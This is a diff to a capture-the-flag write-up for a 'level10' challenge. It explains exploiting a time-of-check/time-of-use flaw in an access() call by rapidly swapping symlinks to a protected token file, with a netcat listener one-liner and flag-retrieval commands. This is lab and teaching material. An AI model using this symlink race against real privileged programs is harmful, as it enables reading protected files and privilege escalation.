@@ -1,7 +1,11 @@
-# Get nc server up
-`while true;  do nc -l 6969 | grep -v '.*( )*.' ; done`
+# Level10
 
-# Run this script to exploit unsecure access function by quickly swapping files
+In orther to get the flag from `level10` program we need two things: a server listening on port 6969 and a script to exploit `access` function flaws.
+Let's get a netcat server running.
+>`while true;  do nc -l 6969 | grep -v '.*( )*.' ; done`
+
+
+Our script will create a `random_file` and a `link`. Two loops will create symlinks: one linking the `random_file` to the `link`, and the other linking the `token` file to the `link`. This rapid replacement will exploit the access policy, allowing us to open the `token` file using the `level10` program.
 ```bash
 #!/bin/bash
 
@@ -23,8 +27,7 @@ do
 done
 ```
 
-# Get the flag
-```bash
-su flag10
-getflag
-```
+Get the flag.
+>`su flag10`
+
+>`getflag`
